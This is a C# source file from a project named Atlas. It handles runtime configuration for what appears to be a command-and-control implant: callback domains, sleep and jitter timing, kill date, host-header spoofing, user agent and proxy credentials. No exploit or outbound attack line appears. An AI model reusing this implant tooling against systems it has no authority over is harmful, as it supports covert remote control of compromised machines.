using System;

namespace Atlas {
    class ConfigManagement {
        public static bool SetConfig(string arg)
        {
            string[] args = arg.Split();
            try
            {
                switch (args[0].ToString())
                {
                    case "domain":
                        if (args[1] == "add")
                        {
                            Messages.Server server = new Messages.Server
                            {
                                domain = args[2],
                                count = 0
                            };
                            Config.Servers.Add(server);
                            break;
                        }
                        else if (args[1] == "remove")
                        {
                            if (Config.Servers.Count == 1)
                            {
                                break;
                            }
                            else
                            {
                                foreach (Messages.Server server in Config.Servers)
                                {
                                    if (server.domain == args[2])
                                    {
                                        Config.Servers.Remove(server);
                                    }
                                }
                                break;
                            }
                        }
                        else
                        {
                            break;
                        }
                    case "sleep":
                        Config.Sleep = int.Parse(args[1]);
                        break;
                    case "jitter":
                        Config.Jitter = int.Parse(args[1]);
                        break;
                    case "kill_date":
                        Config.KillDate = args[1];
                        break;
                    case "host_header":
                        Config.HostHeader = args[1];
                        break;
                    case "user_agent":
                        string ua = string.Join(" ", args);
                        Config.UserAgent = ua.Substring(11);
                        break;
                    case "param":
                        Config.Param = args[1];
                        break;
                    case "proxy":
                        switch (args[1])
                        {
                            case "use_default":
                                if (args[2].ToLower() == "false")
                                {
                                    Config.DefaultProxy = false;
                                }
                                else
                                {
                                    Config.DefaultProxy = true;
                                }
                                break;
                            case "address":
                                Config.ProxyAddress = args[2];
                                break;
                            case "username":
                                Config.ProxyUser = args[2];
                                break;
                            case "password":
                                Config.ProxyPassword = args[2];
                                break;
                            default:
                                return false;
                        }
                        break;
                    default:
                        return false;
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static string GetConnectFails()
        {
            string attempts = "";
            foreach (Messages.Server server in Config.Servers)
            {
                attempts += String.Format("{0} = {1}, ", server.domain, server.count.ToString());
            }
            return attempts;
        }

        public static string GetConfig()
        {
            string servers = "";
            foreach (Messages.Server server in Config.Servers)
            {
                servers += String.Format("{0} ", server.domain);
            }
            return String.Format("Domains: {0}\nSleep: {1}\nJitter: {2}\nKill Date: {3}\nHost Header: {4}\nUser-Agent: {5}\nGET Parameter: {6}\nUse Default Proxy: {7}\nProxy Address: {8}\nProxy Username: {9}\nProxy Password: {10}\nFailed Connections: {11}", servers, Config.Sleep.ToString(), Config.Jitter.ToString(), Config.KillDate, Config.HostHeader, Config.UserAgent, Config.Param, Config.DefaultProxy, Config.ProxyAddress, Config.ProxyUser, Config.ProxyPassword, GetConnectFails());
        }
    }
}